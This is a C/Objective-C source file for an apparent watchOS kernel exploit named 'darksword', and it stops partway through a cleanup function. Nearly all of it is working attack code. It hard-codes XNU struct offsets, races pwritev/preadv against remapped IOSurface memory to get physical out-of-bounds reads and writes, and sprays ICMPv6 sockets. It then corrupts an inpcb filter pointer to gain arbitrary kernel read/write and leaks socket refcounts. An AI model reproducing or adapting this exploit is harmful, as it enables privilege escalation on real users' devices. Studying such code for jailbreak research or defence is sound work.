#import <Foundation/Foundation.h>
#include <unistd.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdio.h>
#include <errno.h>
#include <dlfcn.h>
#include <sys/sysctl.h>
#include <sys/event.h>
#include <sys/resource.h>

#if __has_include(<sys/fileport.h>)
#include <sys/fileport.h>
#else
typedef mach_port_t fileport_t;
extern int fileport_makeport(int fd, fileport_t *portnamep);
extern int fileport_makefd(fileport_t port);
#endif

#include <sys/uio.h>
// preadv/pwritev exist in libSystem but are not declared in the watchOS SDK headers.
extern ssize_t preadv(int fd, const struct iovec *iov, int iovcnt, off_t offset);
extern ssize_t pwritev(int fd, const struct iovec *iov, int iovcnt, off_t offset);

#if __has_include(<IOSurface/IOSurfaceRef.h>)
#import <IOSurface/IOSurfaceRef.h>
#else
typedef struct __IOSurface *IOSurfaceRef;
static const CFStringRef kIOSurfaceAllocSize = CFSTR("IOSurfaceAllocSize");

static IOSurfaceRef (*ds_IOSurfaceCreate)(CFDictionaryRef) = NULL;
static void       *(*ds_IOSurfaceGetBaseAddress)(IOSurfaceRef) = NULL;
static void        (*ds_IOSurfacePrefetchPages)(IOSurfaceRef) = NULL;

static void ds_load_iosurface(void) {
    const char *paths[] = {
        "/System/Library/Frameworks/IOSurface.framework/IOSurface",
        "/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface",
        NULL
    };
    void *h = NULL;
    for (int i = 0; paths[i] && !h; i++) h = dlopen(paths[i], RTLD_NOW | RTLD_GLOBAL);
    if (!h) {
        fprintf(stderr, "[-] IOSurface dlopen failed: %s\n", dlerror());
        pthread_exit(NULL);
    }
    ds_IOSurfaceCreate         = dlsym(h, "IOSurfaceCreate");
    ds_IOSurfaceGetBaseAddress = dlsym(h, "IOSurfaceGetBaseAddress");
    ds_IOSurfacePrefetchPages  = dlsym(h, "IOSurfacePrefetchPages");
    if (!ds_IOSurfaceCreate || !ds_IOSurfaceGetBaseAddress || !ds_IOSurfacePrefetchPages) {
        fprintf(stderr, "[-] IOSurface dlsym failed\n");
        pthread_exit(NULL);
    }
}

#define IOSurfaceCreate         ds_IOSurfaceCreate
#define IOSurfaceGetBaseAddress ds_IOSurfaceGetBaseAddress
#define IOSurfacePrefetchPages  ds_IOSurfacePrefetchPages
#endif

#include "darksword.h"

// Forward-declare console_log (provided by ConsoleBridge.swift via bridging)
extern void console_log(char *log);

// syscall(336,...) is not linkable on watchOS SDK; invoke SYS_proc_info directly.
static int ds_proc_info(int32_t callnum, int32_t pid, uint32_t flavor,
                        uint64_t arg, void *buffer, int32_t buffersize) {
    register int64_t x0 __asm__("x0") = callnum;
    register int64_t x1 __asm__("x1") = pid;
    register int64_t x2 __asm__("x2") = flavor;
    register int64_t x3 __asm__("x3") = arg;
    register void   *x4 __asm__("x4") = buffer;
    register int64_t x5 __asm__("x5") = buffersize;
    register int64_t x16 __asm__("x16") = 336; // SYS_proc_info
    __asm__ volatile("svc #0x80"
                     : "+r"(x0)
                     : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5), "r"(x16)
                     : "memory", "cc");
    return (int)x0;
}

// Redirect printf to the on-screen console
static void _ds_log(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void _ds_log(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    console_log(buf);
    fprintf(stderr, "%s\n", buf);
}
#define printf _ds_log

#define IPPROTO_ICMPV6          58
#define ICMP6_FILTER            18

// Forward decl so FAILURE can clear the run guard on the pthread_exit path.
extern volatile int darksword_running;
#define FAILURE(c) { \
    char _f[64]; snprintf(_f, sizeof(_f), "[FAIL] code=%d", (int)(c)); \
    console_log(_f); \
    darksword_running = 0; \
    pthread_exit(NULL); \
}
#define PRINT_VAR(var) { _ds_log(#var ": %#llx", (unsigned long long)(var)); sleep(2); }

// Offsets verified against xnu-10063.144.1 / RELEASE_ARM64_T8006 (watchOS 10.6.1)
#define OFFSET_PCB_SOCKET      0x40   // inpcb.inp_socket
#define OFFSET_SOCKET_SO_COUNT 0x274  // socket.so_usecount (was 0x228; sockbuf 208B not 192B)
#define OFFSET_ICMP6FILT       0x148  // inpcb.inp_depend6.inp6_icmp6filt (was 0x150)
#define OFFSET_SO_PROTO        0x20   // socket.so_proto (was 0x18; 2B pad before so_options)
#define OFFSET_PR_INPUT        0x28   // protosw.pr_input

#define OOB_OFFSET 0x100
#define OOB_SIZE 0xf00
#define OOB_PAGES_NUM 2

#ifdef __arm64e__
static uint64_t __attribute((naked)) __xpaci(uint64_t a)
{
    asm(".long        0xDAC143E0"); // XPACI X0
    asm("ret");
}
#else
#define __xpaci(x) x
#endif

void memset64(void *ptr, uint64_t val, size_t size)
{
	uint8_t *ptr8 = ptr;
	for (uint64_t idx = 0; idx < size; idx += sizeof(uint64_t)) {
		uint64_t *ptr64 = (uint64_t *)&ptr8[idx];
		*ptr64 = val;
	}
}

int readFd;
int writeFd;
kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
kern_return_t vm_map(vm_map_t target_task, vm_address_t *address, vm_size_t size, vm_address_t mask, int flags, mem_entry_name_port_t object, vm_offset_t offset, boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

static volatile int darksword_cancelled = 0;
volatile int darksword_running = 0;   // run guard (see FAILURE + darksword_run)
static int gWantCurrentProc = 1;      // 1 = leak current_proc anchor (needed for PROCS + PTWALK selftest)
static volatile bool free_thread_needs_join = false;

int highestSuccessIdx = 0;
int successReadCount = 0;
struct iovec iov;
uint64_t randomMarker;
uint64_t wiredPageMarker;
mach_port_t pcObject = MACH_PORT_NULL;
mach_vm_address_t pcAddress = 0;
mach_vm_size_t pcSize;

NSMutableArray<NSNumber *> *socketPorts;
NSMutableArray<NSNumber *> *socketPcbIds;
#define GETSOCKOPT_READ_LEN 32
void *getsockoptReadData = NULL;

volatile uint8_t goSync = 0;
volatile uint8_t raceSync = 0;
volatile uint8_t freeThreadStart = 0;
volatile mach_vm_address_t freeTarget = 0;
volatile mach_vm_size_t freeTargetSize = 0;
volatile mem_entry_name_port_t targetObject = 0;
volatile memory_object_offset_t targetObjectOffset = 0;

void darksword_cancel(void) {
    darksword_cancelled = 1;
    goSync = 0;
    // Don't touch raceSync here - the spin loops check darksword_cancelled directly
}

NSMutableDictionary<NSNumber *, id> *gMlockDict;

int controlSocket = 0;
int rwSocket = 0;
uint64_t controlSocketPcb = 0;
uint64_t rwSocketPcb = 0;
#define EARLY_KRW_LENGTH 0x20
uint8_t controlData[EARLY_KRW_LENGTH];

void setTargetKaddr(uint64_t where)
{
	memset(controlData, 0, EARLY_KRW_LENGTH);
	*(uint64_t *)controlData = where;
	int res = setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH);
	if (res != 0) {
		printf("[-] setsockopt failed!!!\n");
		FAILURE(0);
	}
}

#define TARGET_FILE_SIZE (PAGE_SIZE * 0x2)
void *default_file_content;
char executablePath[PATH_MAX];
const char *executableName;

pthread_t freeThread;

void init_globals(void)
{
#if !__has_include(<IOSurface/IOSurfaceRef.h>)
	ds_load_iosurface();
#endif
	socketPorts = [NSMutableArray new];
	socketPcbIds = [NSMutableArray new];
	getsockoptReadData = calloc(1, GETSOCKOPT_READ_LEN);
	gMlockDict = [NSMutableDictionary new];
	default_file_content = calloc(1, TARGET_FILE_SIZE);
	randomMarker         = (uint64_t)arc4random() << 32 | arc4random();
	wiredPageMarker      = (uint64_t)arc4random() << 32 | arc4random();
}

void create_target_file(const char *path) {
	FILE *f = fopen(path, "w");
	fwrite(default_file_content, 1, TARGET_FILE_SIZE, f);
	fclose(f);
}

void init_target_file()
{
	char *read_file_path = calloc(1, 1024);
    char *write_file_path = calloc(1, 1024);
	confstr(_CS_DARWIN_USER_TEMP_DIR, read_file_path, 1024);
    confstr(_CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024);

	char read_file_name[100];
	char write_file_name[100];
	snprintf(read_file_name, 100, "/%u", arc4random());
	snprintf(write_file_name, 100, "/%u", arc4random());

	strcat(read_file_path, read_file_name);
	strcat(write_file_path, write_file_name);

	create_target_file(read_file_path);
    create_target_file(write_file_path);

	readFd  = open(read_file_path, O_RDWR);
    writeFd = open(write_file_path, O_RDWR);

	printf("[+] readFd: %d\n", readFd);
	printf("[+] writeFd: %d\n", writeFd);

	remove(read_file_path);
    remove(write_file_path);
    fcntl(readFd, F_NOCACHE, 1);
    fcntl(writeFd, F_NOCACHE, 1);
}

void *free_thread(void *arg)
{
	while (freeThreadStart == 0);

	while (goSync == 0);

	while (goSync != 0 && !darksword_cancelled) {
		while (raceSync == 0 && !darksword_cancelled);
		if (darksword_cancelled) return NULL;

		// Single atomic remap (FIXED|OVERWRITE), matching the reference exploit.
		// Using mach_vm_map (64-bit API) with OVERWRITE - NOT vm_deallocate+vm_map,
		// which opened a slower unmapped window and used the 32-bit vm_map.
		mach_vm_address_t ft = freeTarget;
		kern_return_t kr = mach_vm_map(mach_task_self(),
									   &ft,
									   freeTargetSize,
									   0,
									   VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
									   targetObject,
									   targetObjectOffset,
									   0,
									   VM_PROT_DEFAULT,
									   VM_PROT_DEFAULT,
									   VM_INHERIT_NONE);
		freeTarget = ft;

		if (kr != KERN_SUCCESS) {
			printf("[-] mach_vm_map failed !!! kr=%d\n", (int)kr);
            printf("[+] freeTarget: %#llx\n", (unsigned long long)freeTarget);
            printf("[+] targetObject: %#x\n", targetObject);
			FAILURE(0);
		}

		raceSync = 0;
	}

	return NULL;
}

fileport_t spray_socket(NSMutableArray *socketPorts, NSMutableArray *socketPcbIds)
{
	int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
	if (fd == -1) {
		printf("[-] socket create failed!!!");
		return fd;
	}

	fileport_t outputSocketPort = 0;
	fileport_makeport(fd, &outputSocketPort);
	close(fd);

	void *socketInfo = calloc(1, 0x400);
	int r = ds_proc_info(6, getpid(), 3, (uint64_t)outputSocketPort, socketInfo, 0x400);
	uint64_t inp_gencnt = *(uint64_t *)((uintptr_t)socketInfo + 0x110);

	[socketPorts addObject:@(outputSocketPort)];
	[socketPcbIds addObject:@(inp_gencnt)];
	return outputSocketPort;
}

void sockets_release(NSMutableArray *socketPorts, NSMutableArray *socketPcbIds)
{
	while (socketPorts.lastObject) {
		mach_port_deallocate(mach_task_self(), ((NSNumber *)socketPorts.lastObject).unsignedIntValue);
		[socketPorts removeLastObject];
		[socketPcbIds removeLastObject];
	}
}

IOSurfaceRef create_surface_with_address(uint64_t address, uint64_t size) {
	IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		@"IOSurfaceAddress": @(address),
		@"IOSurfaceAllocSize": @(size)
	});

	IOSurfacePrefetchPages(surface);

	return surface;
}

// Wire the pages by binding them to an IOSurface (matches the reference exploit).
// Plain mlock() does NOT reproduce the page-pinning behaviour the race relies on.
void surface_mlock(uint64_t address, uint64_t size)
{
	gMlockDict[@(address)] = (__bridge id)create_surface_with_address(address, size);
}

void surface_munlock(uint64_t address, uint64_t size)
{
	IOSurfaceRef ref = (__bridge IOSurfaceRef)gMlockDict[@(address)];
	if (ref) {
		CFRelease(ref);
		[gMlockDict removeObjectForKey:@(address)];
	}
}


void pe_init(void)
{
	init_target_file();

	if (!executableName) {
		uint32_t sz = PATH_MAX;
		_NSGetExecutablePath(executablePath, &sz);
		executableName = strrchr(executablePath, '/');
		if (executableName) {
			executableName++;
		}
		else {
			executableName = executablePath;
		}
	}

	if (pthread_create(&freeThread, NULL, free_thread, NULL) == 0) {
		free_thread_needs_join = true;
	}
}

void create_physically_contiguous_mapping(mach_port_t *port, mach_vm_address_t *address, mach_vm_size_t size)
{
	// PurpleGfxMem allocates from the GPU memory region: these pages are device
	// memory (not managed DRAM), so the kernel's physical copy path uses a CPU
	// copy window WITHOUT tripping the "attempted to map a managed page" panic in
	// pmap_map_cpu_windows_copy_internal. Dropping this attribute was the root
	// cause of the original watch panic.
	NSDictionary *params = @{
		(__bridge id)kIOSurfaceAllocSize : @(size),
		@"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
	};

	IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);

	if (!surface) {
		printf("[-] Failed to create surface!!!\n");
		FAILURE(0);
	}

	void *physicalMappingAddress = IOSurfaceGetBaseAddress(surface);
	printf("[+] physicalMappingAddress: %p\n", physicalMappingAddress);

	mach_port_t memoryObject;
	kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &size, (mach_vm_address_t)physicalMappingAddress, VM_PROT_DEFAULT, &memoryObject, 0);
	if (kr != KERN_SUCCESS) {
		printf("[-] mach_make_memory_entry_64 failed!!! kr=%d\n", (int)kr);
		FAILURE(0);
	}

	mach_vm_address_t newMappingAddress;
	kr = mach_vm_map(mach_task_self(), &newMappingAddress, size, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, memoryObject, 0, 0, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);

	if (kr != KERN_SUCCESS) {
		printf("[-] mach_vm_map failed!!!\n");
		FAILURE(0);
	}

	CFRelease(surface);
	*port = memoryObject;
	*address = newMappingAddress;
}

void initialize_physical_read_write(uint64_t contiguous_mapping_size)
{
	pcSize = contiguous_mapping_size;
	create_physically_contiguous_mapping(&pcObject, &pcAddress, pcSize);
	printf("[+] pcObject: %u\n", pcObject);
	printf("[+] pcAddress: %#llx\n", pcAddress);
	memset64((void *)pcAddress, randomMarker, pcSize);
	freeTarget = pcAddress,
	freeTargetSize = pcSize;
	freeThreadStart = 1;
	goSync = 1;
}

kern_return_t physical_oob_read_mo(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
{
	targetObject = memoryObject;
	targetObjectOffset = memoryObjectOffset;
	iov.iov_base = (void *)(pcAddress + 0x3f00);
	iov.iov_len = offset + size;
	*(uint64_t *)buffer = randomMarker;
	*(uint64_t *)(pcAddress + 0x3f00 + offset) = randomMarker;

	bool readRaceSucceeded = false;
	int w = 0;
	for (int tryIdx = 0; tryIdx < highestSuccessIdx + 100; tryIdx++) {
		raceSync = 1;
		w = pwritev(readFd, &iov, 1, 0x3f00);
		while (raceSync == 1 && !darksword_cancelled);
		if (darksword_cancelled) { targetObject = 0; return 1; }

		// Remap pcAddress back to pcObject (device memory) in a single atomic
		// FIXED|OVERWRITE mach_vm_map, matching the reference exploit.
		kern_return_t kr = mach_vm_map(mach_task_self(),
									   &pcAddress,
									   pcSize,
									   0,
									   VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
									   pcObject,
									   0,
									   0,
									   VM_PROT_DEFAULT,
									   VM_PROT_DEFAULT,
									   VM_INHERIT_NONE);
		if (kr != KERN_SUCCESS) {
			printf("[-] mach_vm_map failed!!! kr=%d\n", (int)kr);
			FAILURE(0);
		}
		// pwritev returns -1 (EFAULT) when the copyin faulted on the remapped
		// page - that's the signal the race landed. Read the file back; if the
		// marker changed, we captured targetObject's physical contents.
		if (w == -1) {
			pread(readFd, buffer, size, 0x3f00 + offset);
			uint64_t marker = *(uint64_t *)buffer;
			if (marker != randomMarker) {
				readRaceSucceeded = true;
				successReadCount++;
				if (tryIdx > highestSuccessIdx) {
					highestSuccessIdx = tryIdx;
				}
				break;
			} else {
				usleep(1);
			}
		}
		if (tryIdx == 500) {
			break;
		}
	}
	targetObject = 0;
	if (!readRaceSucceeded) return 1;
	return KERN_SUCCESS;
}

kern_return_t physical_oob_read_mo_with_retry(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
{
	kern_return_t kr;
	do {
		kr = physical_oob_read_mo(memoryObject, memoryObjectOffset, size, offset, buffer);
	} while (kr != KERN_SUCCESS);
	return kr;
}

void physical_oob_write_mo(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
{
	targetObject = memoryObject;
	targetObjectOffset = memoryObjectOffset;
	iov.iov_base = (void *)(pcAddress + 0x3f00);
	iov.iov_len = offset + size;

	pwrite(writeFd, buffer, size, 0x3f00 + offset);
	for (int tryIdx = 0; tryIdx < 20; tryIdx++) {
		raceSync = 1;
		preadv(writeFd, &iov, 1, 0x3f00);
		while (raceSync == 1 && !darksword_cancelled);
		if (darksword_cancelled) { targetObject = 0; return; }
		kern_return_t kr = mach_vm_map(mach_task_self(),
									   &pcAddress,
									   pcSize,
									   0,
									   VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
									   pcObject,
									   0,
									   0,
									   VM_PROT_DEFAULT,
									   VM_PROT_DEFAULT,
									   VM_INHERIT_NONE);
		if (kr != KERN_SUCCESS) {
			printf("[-] mach_vm_map failed!!! kr=%d\n", (int)kr);
			FAILURE(0);
		}
	}
	targetObject = 0;
}

void set_target_kaddr(uint64_t where)
{
	memset(controlData, 0, EARLY_KRW_LENGTH);
	*(uint64_t *)controlData = where;
	int res = setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, EARLY_KRW_LENGTH);
	if (res != 0) {
		printf("[-] setsockopt failed!!!");
		FAILURE(0);
	}
}

void early_kread(uint64_t where, void *read_buf, size_t size)
{
	if (size > EARLY_KRW_LENGTH) {
      printf("[!] error: (size > EARLY_KRW_LENGTH)\n");
      FAILURE(0);
    }
    set_target_kaddr(where);
    socklen_t read_data_length = size;
    int res = getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, &read_data_length);
    if (res != 0) {
		printf("[-] getsockopt failed!!!\n");
		FAILURE(0);
    }
}

uint64_t early_kread64(uint64_t where)
{
	uint64_t value = 0;
	early_kread(where, &value, sizeof(value));
	return value;
}

void early_kwrite32bytes(uint64_t where, uint8_t writeBuf[EARLY_KRW_LENGTH])
{
	set_target_kaddr(where);
	int res = setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, writeBuf, EARLY_KRW_LENGTH);
	if (res != 0) {
		printf("[-] setsockopt failed!!!");
		FAILURE(0);
	}
}

void early_kwrite64(uint64_t where, uint64_t what)
{
	uint8_t writeBuf[EARLY_KRW_LENGTH];
	early_kread(where, writeBuf, EARLY_KRW_LENGTH);
	*(uint64_t *)writeBuf = what;
	early_kwrite32bytes(where, writeBuf);
}

int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOffset, void *readBuffer, void *writeBuffer, NSMutableArray *targetInpGencntList, bool doRead)
{
	if (doRead) {
		physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
	}

	int searchStartIdx = 0;
	bool targetFound = false;
	uint64_t pcbStartOffset = 0;
	void *found = NULL;
	do {
		found = memmem(readBuffer + searchStartIdx, OOB_SIZE - searchStartIdx, executableName, strlen(executableName));
		if (found) {
			pcbStartOffset = (uint64_t)found - (uint64_t)readBuffer & 0xFFFFFFFFFFFFFC00;
			if (*(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT + 8)) {
				targetFound = true;
				break;
			}
		}
		searchStartIdx += 0x400;
	} while (found == NULL && searchStartIdx < OOB_SIZE);

	if (targetFound) {
		printf("[+] pcbStartOffset: %#llx\n", pcbStartOffset);
		uint64_t targetInpGencnt = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + 0x78);
		printf("[+] targetInpGencnt: %#llx\n", targetInpGencnt);
		if (targetInpGencnt == socketPcbIds.lastObject.unsignedLongLongValue) {
			printf("[-] Found last PCB\n");
			return -1;
		}
		bool isOurPcd = false;
		int controlSocketIdx = 0;
		for (int sockIdx = 0; sockIdx < (int)socketPorts.count; sockIdx++) {
			if (socketPcbIds[sockIdx].unsignedLongLongValue == targetInpGencnt) {
				isOurPcd = true;
				controlSocketIdx = sockIdx;
				break;
			}
		}
		if (!isOurPcd) {
			printf("[-] Found freed PCB Page!\n");
			return -1;
		}
		if ([targetInpGencntList containsObject:@(targetInpGencnt)]) {
			printf("[-] Found old PCB Page!!!!\n");
			return -1;
		} else {
			[targetInpGencntList addObject:@(targetInpGencnt)];
		}
		uint64_t inpListNextPointer = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + 0x28) - 0x20;
		uint64_t icmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT);
		printf("[+] inpListNextPointer: %#llx\n", inpListNextPointer);
		printf("[+] icmp6Filter: %#llx\n", icmp6Filter);
		rwSocketPcb = inpListNextPointer;
		memcpy(writeBuffer, readBuffer, OOB_SIZE);
		*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT) = inpListNextPointer + OFFSET_ICMP6FILT;
		*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT + 8) = 0;

		printf("[+] Corrupting icmp6filter pointer...\n");
		while (true) {
			physical_oob_write_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, writeBuffer);
			physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
			uint64_t newIcmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT);
			if (newIcmp6Filter == inpListNextPointer + OFFSET_ICMP6FILT) {
				printf("[+] target corrupted: %#llx\n", *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT));
				break;
			}
		}
		int sock = fileport_makefd((fileport_t)socketPorts[controlSocketIdx].unsignedLongLongValue);
		socklen_t len = GETSOCKOPT_READ_LEN;
		int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockoptReadData, &len);
		if (res != 0) {
			printf("[-] getsockopt failed!!!\n");
			FAILURE(0);
		}
		uint64_t marker = *(uint64_t *)getsockoptReadData;
		if (marker != (uint64_t)-1) {
			printf("[+] Found control_socket at idx: %u\n", controlSocketIdx);
			controlSocket = sock;
			rwSocket = fileport_makefd((fileport_t)socketPorts[controlSocketIdx + 1].unsignedLongLongValue);
			return KERN_SUCCESS;
		}
		else {
			printf("[-] Failed to corrupt control_socket at idx: %u\n", controlSocketIdx);
		}
	}
	return -1;
}

void pe_v1(void)
{
	// watchOS on S4 (Watch4,x) has 1GB RAM total; the original 0x1000*0x10 page budget
	// physically commits ~1GB via the page-touch loop and triggers jetsam immediately.
	// Scale down: 0x80 * 0x10 pages total, 0x80 pages per mapping => 8 mappings of 8MB each (16KB pages).
	// S4 (Watch4,x) has 1GB RAM; 0x80*0x10 pages => 8 mappings of 8MB (16KB pages).
	uint64_t totalSearchMappingPagesNum = 0x80 * 0x10;
	uint64_t searchMappingSize          = 0x80 * PAGE_SIZE;
	uint64_t totalSearchMappingSize = totalSearchMappingPagesNum * PAGE_SIZE;
	uint64_t searchMappingNum = totalSearchMappingSize / searchMappingSize;

	void *readBuffer = calloc(1, OOB_SIZE);
	void *writeBuffer = calloc(1, OOB_SIZE);
	initialize_physical_read_write(OOB_PAGES_NUM * PAGE_SIZE);
	sleep(2);
	kern_return_t kr = KERN_SUCCESS;
	NSMutableArray *targetInpGencntList = [NSMutableArray new];
	while (true) {
		if (darksword_cancelled) {
			printf("[pe_v1] cancelled, aborting\n");
			break;
		}
		NSMutableArray<NSNumber *> *searchMappings = [NSMutableArray new];
		for (uint64_t s = 0; s < searchMappingNum; s++) {
			mach_vm_address_t searchMappingAddress = 0;
			kr = mach_vm_allocate(mach_task_self(), &searchMappingAddress, searchMappingSize, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
			if (kr != KERN_SUCCESS) {
				printf("[-] mach_vm_allocate failed!!!\n");
				FAILURE(0);
			}
			// Fill every page with randomMarker. This is the sentinel: after the
			// race lands, a page still ours reads back randomMarker, while a page
			// reclaimed by the kernel as a socket inpcb reads back kernel data
			// (!= randomMarker) - which is how we detect a usable PUAF page.
			for (uint64_t k = 0; k < searchMappingSize; k += PAGE_SIZE) {
				*(uint64_t *)(searchMappingAddress + k) = randomMarker;
			}
			[searchMappings addObject:@(searchMappingAddress)];
		}
		socketPorts = [NSMutableArray new];
		socketPcbIds = [NSMutableArray new];
		unsigned socketPortsCount = 0;
		#define OPEN_MAX 10240
		int maxfiles = OPEN_MAX * 3;
		int leeway = 4096 * 2;
		for (unsigned socketCount = 0; socketCount < (unsigned)(maxfiles - leeway); socketCount++) {
			mach_port_t port = spray_socket(socketPorts, socketPcbIds);
			if (port == (mach_port_t)-1) {
				printf("[-] Failed to spray sockets: %u\n", socketCount);
				break;
			} else {
				socketPortsCount++;
			}
		}
		uint64_t startPcbId = socketPcbIds.firstObject.unsignedLongLongValue;
		uint64_t endPcbId = socketPcbIds.lastObject.unsignedLongLongValue;
		printf("[pe_v1] sprayed %u sockets, scanning for PCB...\n", socketPortsCount);
		sleep(2);
		bool success = false;
		for (uint64_t s = 0; s < searchMappingNum; s++) {
			mach_vm_address_t searchMappingAddress = searchMappings[s].unsignedLongLongValue;
			mach_port_t memoryObject = 0;
			mach_vm_size_t memoryObjectSize = searchMappingSize;
			kr = mach_make_memory_entry_64(mach_task_self(), &memoryObjectSize, searchMappingAddress, VM_PROT_DEFAULT, &memoryObject, 0);
			if (kr != KERN_SUCCESS) {
				printf("[-] mach_make_memory_entry_64 failed!!!");
				FAILURE(0);
			}
			surface_mlock(searchMappingAddress, searchMappingSize);
			mach_vm_offset_t seekingOffset = 0;
			while (seekingOffset + pcSize <= searchMappingSize) {
				if (darksword_cancelled) break;
				// One race attempt per offset (reference semantics). Only when the
				// race lands (KERN_SUCCESS) do we scan the captured page for a PCB.
				kr = physical_oob_read_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
				if (kr == KERN_SUCCESS) {
					if (find_and_corrupt_socket(memoryObject, seekingOffset, readBuffer, writeBuffer, targetInpGencntList, false) == KERN_SUCCESS) {
						success = true;
						break;
					}
				}
				seekingOffset += PAGE_SIZE;
			}
			kr = mach_port_deallocate(mach_task_self(), memoryObject);
			if (kr != KERN_SUCCESS) {
				printf("[-] mach_port_deallocate failed!!!\n");
				FAILURE(0);
			}
			if (success == true) {
				break;
			}
		}
		if (success) {
			printf("[pe_v1] PCB corrupt OK (rwSocketPcb=%#llx)\n", rwSocketPcb);
			sleep(2);
		} else {
			printf("[pe_v1] attempt failed, retrying...\n");
			sleep(1);
		}
		sockets_release(socketPorts, socketPcbIds);
		for (uint64_t s = 0; s < searchMappingNum; s++) {
			mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
			[searchMappings removeLastObject];
			kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
		}
		if (success == true) {
			break;
		}
	}
}

void krw_sockets_leak_forever(void)
{
	uint64_t controlSocketAddr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
	uint64_t rwSocketAddr = early_kread64(rwSocketPcb + OFFSET_PCB_SOCKET);

	if (!controlSocketAddr || !rwSocketAddr) {
		printf("[-] Couldn't find controlSocketAddr || rwSocketAddr\n");
		FAILURE(0);
	}

	uint64_t controlSocketSoCount = early_kread64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT);
	uint64_t rwSocketSoCount = early_kread64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT);
	early_kwrite64(controlSocketAddr + OFFSET_SOCKET_SO_COUNT, controlSocketSoCount + 0x0000100100001001);
	early_kwrite64(rwSocketAddr + OFFSET_SOCKET_SO_COUNT, rwSocketSoCount + 0x0000100100001001);

	early_kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
}

// Best-effort reversal of the kernel state darksword holds, so the app can exit
// without panicking on socket teardown. Undoes the so_count leak (so the leaked
// sockets are freeable again) and NULLs the self-referential inp6_icmp6filt pointer
// (the corruption that panics when the kernel frees it). The icmp6filt write is LAST
// because it disables the early_kr/w primitive. Returns after cleanup; caller exits.
void darksword_cleanup(void)
{
	if (!rwSocketPcb || !controlSocketPcb) { printf("[cleanup] nothing held\n"); return; }
	printf("[cleanup] restoring kernel state...\n");
	uint64_t cAddr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
	uint64_t rAddr = early_kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
	if (cAddr) {
		uint64_t c = early_kread64(cAddr + OFFSET_SOCKET_SO_COUNT);
		early_kwrite64(cAddr + OFFSET_SOCKET_SO_COUNT, c - 0x0000100100001001);
	}
	if (rAddr) {
		uint64_t r = early_kread64(rAddr + OFFSET_SOCKET_SO_COUNT);
		early_kwrite64(rAddr + OFFSET_SOCKET_SO_COUNT, r - 0x0000100100001001);
	}
	// LAST: NULL the corrupted filter pointer (kfree(NULL) is safe). This kills the
	// r/w primitive, so no early_kr/w after this point.
	early_kwrite64(rwSocketPcb + OFFSET_ICMP6FILT, 0);
	early_kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
